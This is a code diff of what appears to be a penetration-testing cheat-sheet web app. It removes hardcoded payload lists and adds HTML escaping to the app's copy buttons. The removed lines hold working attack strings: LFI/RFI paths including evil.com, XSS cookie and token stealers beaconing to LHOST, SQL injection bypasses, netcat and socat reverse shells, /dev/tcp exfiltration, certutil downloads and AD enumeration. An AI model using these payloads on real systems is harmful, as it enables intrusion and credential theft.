@@ -487,12 +487,10 @@ button,input,select,textarea{font-family:var(--mono);}
       </div>
       <div class="sec">
         <div class="sec-hdr"><span class="sec-icon">🕵️</span><span class="sec-lbl">obfuscated web shells</span></div>
-        <div class="sp-search-bar"><input type="text" id="php-search" placeholder="search php shells..." oninput="renderCmdPage(\'php\')"></div>
+        <div class="sp-search-bar"><input type="text" id="php-search" placeholder="search php shells..." oninput="renderCmdPage('php')"></div>
         <div class="cmd-list" id="php-cmd-list"></div>
       </div>
     </div>
-  </div>
-</div>
   </div>
 </div>
 
@@ -517,20 +515,8 @@ button,input,select,textarea{font-family:var(--mono);}
         <div id="lfi-basic" class="tpane on">
           <div class="cmd-list" id="lfi-cmd-basic"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">double encoding</div><div class="cmd-val">..%252f..%252f..%252fetc%252fpasswd</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">unicode / overlong UTF-8</div><div class="cmd-val">..%c0%af..%c0%af..%c0%afetc%c0%afpasswd</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">path truncation (PHP &lt;5.3)</div><div class="cmd-val">../../../../etc/passwd..........</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">proc/self/environ RCE inject</div><div class="cmd-val">../../proc/self/environ</div></div>
-          </div>
-        </div>
         <div id="lfi-wrappers" class="tpane">
           <div class="cmd-list" id="lfi-cmd-wrappers"></div>
-        </div>
-            <div class="cmd-item"><div class="cmd-lbl">expect RCE</div><div class="cmd-val">?page=expect://ls</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">remote file (RFI)</div><div class="cmd-val">?page=http://evil.com/shell.txt</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">input stream RCE (POST body = php)</div><div class="cmd-val">?page=php://input</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">data URI RCE</div><div class="cmd-val">?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=</div></div>
-          </div>
         </div>
         <div id="lfi-linux" class="tpane">
           <div class="cmd-list" id="lfi-linux-list"></div>
@@ -567,51 +553,19 @@ button,input,select,textarea{font-family:var(--mono);}
         <div id="xss-grab" class="tpane on">
           <div class="cmd-list" id="xss-cmd-grab"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">localStorage access_token</div><div class="cmd-val">&lt;script&gt;document.location='http://LHOST/grab.php?c='+localStorage.getItem('access_token')&lt;/script&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">image beacon (cookie)</div><div class="cmd-val">&lt;script&gt;new Image().src='http://LHOST/c.php?c='+document.cookie;&lt;/script&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">fetch exfil (base64)</div><div class="cmd-val">&lt;script&gt;fetch('http://LHOST/?c='+btoa(document.cookie))&lt;/script&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">keylogger skeleton</div><div class="cmd-val">&lt;script&gt;document.onkeypress=function(e){fetch('http://LHOST/?k='+e.key)}&lt;/script&gt;</div></div>
-          </div>
-        </div>
         <div id="xss-html" class="tpane">
           <div class="cmd-list" id="xss-cmd-html"></div>
-        </div>
-            <div class="cmd-item"><div class="cmd-lbl">script tag bypass (filter evasion)</div><div class="cmd-val">&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">attribute breakout</div><div class="cmd-val">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">img onerror</div><div class="cmd-val">&lt;img src=x onerror=alert(1)&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">img onerror (fromCharCode)</div><div class="cmd-val">&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">body onload</div><div class="cmd-val">&lt;body onload=alert(1)&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">input autofocus onfocus</div><div class="cmd-val">&lt;input autofocus onfocus=alert(1)&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">href javascript</div><div class="cmd-val">&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</div></div>
-          </div>
         </div>
         <div id="xss-md" class="tpane">
           <div class="cmd-list" id="xss-cmd-md"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">space obfuscation</div><div class="cmd-val">[a](j a v a s c r i p t:prompt(document.cookie))</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">data URI base64</div><div class="cmd-val">[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">window.onerror</div><div class="cmd-val">[a](javascript:window.onerror=alert;throw%201)</div></div>
-          </div>
-        </div>
         <div id="xss-svg" class="tpane">
           <div class="cmd-list" id="xss-cmd-svg"></div>
-        </div>
-            <div class="cmd-item"><div class="cmd-lbl">svg desc CDATA</div><div class="cmd-val">&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">svg foreignObject CDATA</div><div class="cmd-val">&lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">svg title CDATA</div><div class="cmd-val">&lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;</div></div>
-          </div>
         </div>
         <div id="xss-bypass" class="tpane">
           <div class="cmd-list" id="xss-cmd-bypass"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">Function constructor</div><div class="cmd-val">Function('ale'+'rt(1)')()</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">setTimeout string</div><div class="cmd-val">setTimeout('ale'+'rt(2)')</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">Set.constructor template</div><div class="cmd-val">Set.constructor`alert(1)```</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">new Function template</div><div class="cmd-val">new Function`alert`6``</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">JSFuck-style (alert)</div><div class="cmd-val">[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]</div></div>
-          </div>
         </div>
-      </div>
     </div>
   </div>
 </div>
@@ -636,54 +590,16 @@ button,input,select,textarea{font-family:var(--mono);}
         <div id="sqli-union" class="tpane on">
           <div class="cmd-list" id="sqli-cmd-union"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">null probe (Oracle)</div><div class="cmd-val">' UNION SELECT NULL,NULL,NULL FROM DUAL-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">column count (ORDER BY)</div><div class="cmd-val">' ORDER BY 1-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">version (MySQL/MSSQL)</div><div class="cmd-val">' UNION SELECT @@version-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">version (Oracle)</div><div class="cmd-val">' UNION SELECT banner FROM v$version-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">version (Postgres)</div><div class="cmd-val">' UNION SELECT version()-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">tables (MySQL/MSSQL/PG)</div><div class="cmd-val">' UNION SELECT table_name,NULL FROM INFORMATION_SCHEMA.TABLES-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">tables (Oracle)</div><div class="cmd-val">' UNION SELECT table_name,NULL FROM all_tables-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">columns (MySQL/MSSQL/PG)</div><div class="cmd-val">' UNION SELECT column_name,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='X'-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">concat values (MySQL/PG)</div><div class="cmd-val">' UNION SELECT concat(col1,':',col2) FROM tablename LIMIT 1-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">concat values (Oracle/PG)</div><div class="cmd-val">' UNION SELECT col1||':'||col2,NULL FROM tablename-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">concat values (MSSQL)</div><div class="cmd-val">' UNION SELECT col1+':'+col2,NULL FROM tablename-- -</div></div>
-          </div>
-        </div>
         <div id="sqli-blind" class="tpane">
           <div class="cmd-list" id="sqli-cmd-blind"></div>
-        </div>
-            <div class="cmd-item"><div class="cmd-lbl">time-based (MSSQL)</div><div class="cmd-val">'; WAITFOR DELAY '0:0:5'--</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">conditional error (MySQL)</div><div class="cmd-val">' UNION SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">conditional error (Postgres)</div><div class="cmd-val">' UNION SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE NULL END-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">conditional error (Oracle)</div><div class="cmd-val">' UNION SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">conditional error (MSSQL)</div><div class="cmd-val">' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END-- -</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">error-based extractvalue (MySQL)</div><div class="cmd-val">' AND extractvalue(1,concat(0x7e,(SELECT version())))--</div></div>
-          </div>
         </div>
         <div id="sqli-auth" class="tpane">
           <div class="cmd-list" id="sqli-cmd-auth"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">double-quote close</div><div class="cmd-val">") or true--</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">single-quote close</div><div class="cmd-val">') or true--</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">admin bypass (--)</div><div class="cmd-val">admin') or ('1'='1'--</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">admin bypass (#)</div><div class="cmd-val">admin') or ('1'='1'#</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">1=1 always true</div><div class="cmd-val">' OR '1'='1</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">version check probe</div><div class="cmd-val">' AND MID(VERSION(),1,1) = '5';</div></div>
-          </div>
-        </div>
         <div id="sqli-order" class="tpane">
           <div class="cmd-list" id="sqli-cmd-order"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">ORDER BY column count 2</div><div class="cmd-val">1' ORDER BY 2--+</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">ORDER BY column count 3</div><div class="cmd-val">1' ORDER BY 3--+</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">GROUP BY 1,2,3</div><div class="cmd-val">1' GROUP BY 1,2,3--+</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">GROUP BY having</div><div class="cmd-val">' GROUP BY columnnames having 1=1--</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">UNION 3 cols</div><div class="cmd-val">-1' UNION SELECT 1,2,3--+</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">INTO @ probe (MSSQL)</div><div class="cmd-val">-1 UNION SELECT 1 INTO @,@,@</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">sysobjects enum (MSSQL)</div><div class="cmd-val">' and 1 in (select min(name) from sysobjects where xtype='U' and name > '.')--</div></div>
-          </div>
         </div>
-      </div>
     </div>
   </div>
 </div>
@@ -710,63 +626,22 @@ button,input,select,textarea{font-family:var(--mono);}
         <div id="linux-suid" class="tpane on">
           <div class="cmd-list" id="linux-cmd-suid"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">find SUID (alt)</div><div class="cmd-val">find / -perm -u=s -type f 2>/dev/null</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">find SUID list</div><div class="cmd-val">find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/suid</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">capabilities</div><div class="cmd-val">getcap -r / 2>/dev/null</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">world-writable files</div><div class="cmd-val">find / -perm -o+w -type f 2>/dev/null | grep -v proc</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">find txt files</div><div class="cmd-val">find / -type f -name '*.txt' 2>/dev/null</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">TAR wildcard privesc step 1</div><div class="cmd-val">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 1234 >/tmp/f" > shell.sh</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">TAR wildcard privesc step 2</div><div class="cmd-val">touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">TAR wildcard privesc step 3</div><div class="cmd-val">touch "/var/www/html/--checkpoint=1"</div></div>
-          </div>
-        </div>
         <div id="linux-sysinfo" class="tpane">
           <div class="cmd-list" id="linux-cmd-sysinfo"></div>
-        </div>
-            <div class="cmd-item"><div class="cmd-lbl">kernel version</div><div class="cmd-val">uname -a; cat /proc/version</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">env variables</div><div class="cmd-val">cat /etc/profile; cat ~/.bashrc; env</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">service configs</div><div class="cmd-val">cat /etc/apache2/apache2.conf; cat /etc/my.conf</div></div>
-          </div>
         </div>
         <div id="linux-cron" class="tpane">
           <div class="cmd-list" id="linux-cmd-cron"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">list cron spool</div><div class="cmd-val">ls -alh /var/spool/cron</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">all cron files</div><div class="cmd-val">ls -al /etc/cron*; cat /etc/crontab; cat /etc/anacrontab</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">root crontab</div><div class="cmd-val">cat /var/spool/cron/crontabs/root</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">at allow/deny</div><div class="cmd-val">cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny</div></div>
-          </div>
-        </div>
         <div id="linux-net" class="tpane">
           <div class="cmd-list" id="linux-cmd-net"></div>
-        </div>
-            <div class="cmd-item"><div class="cmd-lbl">port 80 check</div><div class="cmd-val">lsof -i :80; grep 80 /etc/services</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">login history</div><div class="cmd-val">last; lastlog</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">running services</div><div class="cmd-val">chkconfig --list; chkconfig --list | grep 3:on</div></div>
-          </div>
         </div>
         <div id="linux-portfwd" class="tpane">
           <div class="cmd-list" id="linux-cmd-portfwd"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">SSH remote port forward</div><div class="cmd-val">ssh -R 8080:127.0.0.1:80 root@192.168.1.7</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">nc port relay</div><div class="cmd-val">mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">nc proxy (port 80→8080)</div><div class="cmd-val">mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe</div></div>
-          </div>
-        </div>
         <div id="linux-filetransfer" class="tpane">
           <div class="cmd-list" id="linux-cmd-filetransfer"></div>
         </div>
-            <div class="cmd-item"><div class="cmd-lbl">python2 HTTP server</div><div class="cmd-val">python -m SimpleHTTPServer 8080</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">bash upload over HTTP</div><div class="cmd-val">bash -c 'echo -e "POST / HTTP/0.9\n$(cat file)" > /dev/tcp/LHOST/PORT'</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">bash TCP exfil (receiver)</div><div class="cmd-val">nc -l -p 54 > data</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">bash TCP exfil (sender)</div><div class="cmd-val">bash -c 'cat file > /dev/tcp/LHOST/54'</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">nc send file</div><div class="cmd-val">nc -lnvp 54 > file_saved</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">nc receive file</div><div class="cmd-val">nc LHOST 54 &lt; file_to_send</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">SCP upload</div><div class="cmd-val">scp file user@192.168.1.1:~/dest -P 22</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">SCP download</div><div class="cmd-val">scp user@192.168.1.1:~/file saved_file -P 22</div></div>
-          </div>
         </div>
-      </div>
     </div>
   </div>
 </div>
@@ -789,43 +664,13 @@ button,input,select,textarea{font-family:var(--mono);}
       </div>
       <div id="win-tabs">
         <div id="win-sysinfo" class="tpane on">
-          <div class="cmd-list" id="win-cmd-sysinfo"></div>
-        </div>
-            <div class="cmd-item"><div class="cmd-lbl">hostname + domain</div><div class="cmd-val">echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">security patches</div><div class="cmd-val">Get-Hotfix -description "Security update"</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">hotfix (wmic)</div><div class="cmd-val">wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">env variables</div><div class="cmd-val">Get-ChildItem Env: | ft Key,Value</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">WLAN profiles</div><div class="cmd-val">netsh wlan show profiles</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">WLAN password</div><div class="cmd-val">netsh wlan show profile name="PROFILE-NAME" key=clear</div></div>
-          </div>
+          <div class="cmd-list" id="windows-cmd-sysinfo"></div>
         </div>
         <div id="win-http" class="tpane">
-          <div class="cmd-list" id="win-cmd-http"></div>
-        </div>
-            <div class="cmd-item"><div class="cmd-lbl">certutil download</div><div class="cmd-val">certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">bitsadmin download</div><div class="cmd-val">bitsadmin /transfer job /download /priority high http://10.10.10.10/file C:\file</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">PS Net.WebClient</div><div class="cmd-val">(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/file','C:\file')</div></div>
-          </div>
+          <div class="cmd-list" id="windows-cmd-http"></div>
         </div>
         <div id="win-ad" class="tpane">
-          <div class="cmd-list" id="win-cmd-ad"></div>
-        </div>
-            <div class="cmd-item"><div class="cmd-lbl">domain enum</div><div class="cmd-val">Get-NetDomain; Get-NetForestDomain; Get-DomainSID</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">domain policy</div><div class="cmd-val">Get-DomainPolicy</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">OUs</div><div class="cmd-val">Get-NetOU</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">domain trusts</div><div class="cmd-val">Get-NetDomainTrust</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">GPO on computer</div><div class="cmd-val">Get-NetGPO -ComputerName computername.domain.com</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">password last set</div><div class="cmd-val">Get-UserProperty –Properties pwdlastset</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">description field (pass hunt)</div><div class="cmd-val">Find-UserField -SearchField Description -SearchTerm "pass"</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">list computers</div><div class="cmd-val">Get-NetComputer; Get-NetComputer -Ping</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">OS filter</div><div class="cmd-val">Get-NetComputer -OperatingSystem "Windows 7 Ultimate"</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">domain admins</div><div class="cmd-val">Get-NetGroupMember -GroupName "Domain Admins"</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">admin groups</div><div class="cmd-val">Get-NetGroup *admin*</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">user ACL</div><div class="cmd-val">Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">password reset rights</div><div class="cmd-val">Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">export users (ldifde)</div><div class="cmd-val">ldifde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.ldf</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">export users (csvde)</div><div class="cmd-val">csvde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.csv</div></div>
-          </div>
+          <div class="cmd-list" id="windows-cmd-ad"></div>
         </div>
         <div id="win-ad-scripts" class="tpane">
           <div class="cb"><div class="cb-hdr"><span class="cb-lang">powershell — enumerate domain users</span><button class="cpbtn" onclick="copyById('ps-users')">copy</button></div>
@@ -1136,17 +981,7 @@ $Searcher.FindAll() | Foreach {
       <div class="sec">
         <div class="sec-hdr"><span class="sec-icon">⚡</span><span class="sec-lbl">quick spawn methods</span></div>
         <div class="sp-search-bar" style="margin-top:.5rem;"><input type="text" id="tty-search" placeholder="search spawn methods..." oninput="renderCmdPage('tty')"></div>
-        <div class="cmd-list" id="tty-cmd-list"></div><div class="cmd-val">python -c 'import pty; pty.spawn("/bin/bash")'</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">os.system</div><div class="cmd-val">echo os.system('/bin/bash')</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">bash -i</div><div class="cmd-val">/bin/sh -i</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">perl</div><div class="cmd-val">perl -e 'exec "/bin/sh";'</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">ruby</div><div class="cmd-val">ruby: exec "/bin/sh"</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">lua</div><div class="cmd-val">lua: os.execute("/bin/sh")</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">vi escape</div><div class="cmd-val">:!bash  (or :set shell=/bin/bash:shell)</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">nmap</div><div class="cmd-val">!sh</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">socat (full TTY)</div><div class="cmd-val">socat file:`tty`,raw,echo=0 tcp-listen:4444</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">socat target side</div><div class="cmd-val">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444</div></div>
-        </div>
+        <div class="cmd-list" id="tty-cmd-list"></div>
       </div>
     </div>
   </div>
@@ -1676,13 +1511,13 @@ function renderPayloads(){
   document.getElementById('payload-grid').innerHTML=filtered.map((p,i)=>`
     <div class="p-card">
       <div class="p-top">
-        <span class="p-name">${p.title}</span>
-        <div class="p-tags">${p.tags.map(t=>`<span class="pt ${TAG_CLASS[t]||'pt-web'}">${t}</span>`).join('')}</div>
+        <span class="p-name">${escHtml(p.title)}</span>
+        <div class="p-tags">${p.tags.map(t=>`<span class="pt ${TAG_CLASS[t]||'pt-web'}">${escHtml(t)}</span>`).join('')}</div>
       </div>
-      <div class="p-code">${p.code.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>
+      <div class="p-code">${escHtml(p.code)}</div>
       <div class="p-foot">
-        <span class="p-desc">${p.desc}</span>
-        <button class="btn" style="padding:3px 9px;font-size:10px;" onclick="copyText(${JSON.stringify(p.code)},this)">copy</button>
+        <span class="p-desc">${escHtml(p.desc)}</span>
+        <button class="btn" style="padding:3px 9px;font-size:10px;" data-cmd="${escHtml(p.code)}" onclick="copyText(this.dataset.cmd,this)">copy</button>
       </div>
     </div>`).join('');
 }
@@ -1783,9 +1618,9 @@ async function generateHashes(){
     {lbl:'Base64',val:btoa(unescape(encodeURIComponent(inp)))},
     {lbl:'Hex',val:Array.from(inp).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('')},
   ].map(h=>`<div class="cmd-item" style="display:grid;grid-template-columns:80px 1fr auto;gap:8px;align-items:center;">
-    <div class="cmd-lbl">${h.lbl}</div>
-    <div class="cmd-val" style="word-break:break-all;">${h.val}</div>
-    <button class="btn" style="padding:3px 9px;font-size:10px;flex-shrink:0;" onclick="copyText('${h.val}',this)">copy</button>
+    <div class="cmd-lbl">${escHtml(h.lbl)}</div>
+    <div class="cmd-val" style="word-break:break-all;">${escHtml(h.val)}</div>
+    <button class="btn" style="padding:3px 9px;font-size:10px;flex-shrink:0;" data-cmd="${escHtml(h.val)}" onclick="copyText(this.dataset.cmd,this)">copy</button>
   </div>`).join('');
 }
 
@@ -1960,7 +1795,7 @@ function buildPayloadEditor(){
         <div class="ef" style="margin:0"><label>description</label><input type="text" value="${escHtml(p.desc)}" data-f="desc"></div>
         <button class="del-btn" onclick="deletePayload(${i})">delete</button>
       </div>
-      <div class="ef" style="margin-top:.5rem;"><label>tags (comma separated)</label><input type="text" value="${p.tags.join(',')}" data-f="tags"></div>
+      <div class="ef" style="margin-top:.5rem;"><label>tags (comma separated)</label><input type="text" value="${escHtml(p.tags.join(','))}" data-f="tags"></div>
     </div>`).join('');
 }
 function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
@@ -2800,7 +2635,7 @@ function renderCmdList(containerEl, items, search=''){
         ${it.lbl?`<div class="cmd-lbl">${escHtml(it.lbl)}</div>`:''}
         <div class="cmd-val">${escHtml(it.val)}</div>
       </div>
-      <button class="btn" style="padding:3px 9px;font-size:10px;flex-shrink:0;margin-top:${it.lbl?'14px':'0'};" onclick="copyText(${JSON.stringify(it.val)},this)">copy</button>
+      <button class="btn" style="padding:3px 9px;font-size:10px;flex-shrink:0;margin-top:${it.lbl?'14px':'0'};" data-cmd="${escHtml(it.val)}" onclick="copyText(this.dataset.cmd,this)">copy</button>
     </div>`).join('');
 }
 
